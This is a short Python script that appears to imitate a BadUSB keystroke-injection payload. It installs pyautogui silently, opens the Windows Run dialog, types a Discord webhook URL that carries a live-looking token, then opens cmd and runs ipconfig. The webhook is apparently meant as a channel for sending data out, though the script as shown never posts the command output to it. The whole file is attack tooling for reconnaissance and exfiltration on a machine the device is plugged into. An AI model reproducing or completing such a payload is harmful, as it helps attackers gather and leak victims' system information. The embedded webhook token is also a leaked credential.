import subprocess
import time
import sys

# Function to install pyautogui if it's not installed
def install_pyautogui():
    try:
        import pyautogui
    except ImportError:
        print("Installing pyautogui...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pyautogui"])

# Install pyautogui
install_pyautogui()

# Now we can import pyautogui and use it
import pyautogui

# Wait a moment to simulate the delay after the device is plugged in
time.sleep(2)

# Simulate opening the Run dialog (Win + R)
pyautogui.hotkey('win', 'r')  # Simulates Win + R
time.sleep(1)

# Open a web browser and navigate to a URL (Discord Webhook)
url = "https://discord.com/api/webhooks/1329516594887659611/FEgNHjHO6JzJ_AcclPtkHiTKsfZ-gRtz3j0jUlSbv_yAjbUODrj-s-bXCm65tilMBriQ"
pyautogui.write(url)
pyautogui.press('enter')

time.sleep(2)

# Open command prompt and execute a command
pyautogui.hotkey('win', 'r')  # Open Run dialog again
time.sleep(1)
pyautogui.write('cmd')
pyautogui.press('enter')
time.sleep(1)

# Simulate typing the 'ipconfig' command and pressing enter
pyautogui.write('ipconfig')
pyautogui.press('enter')
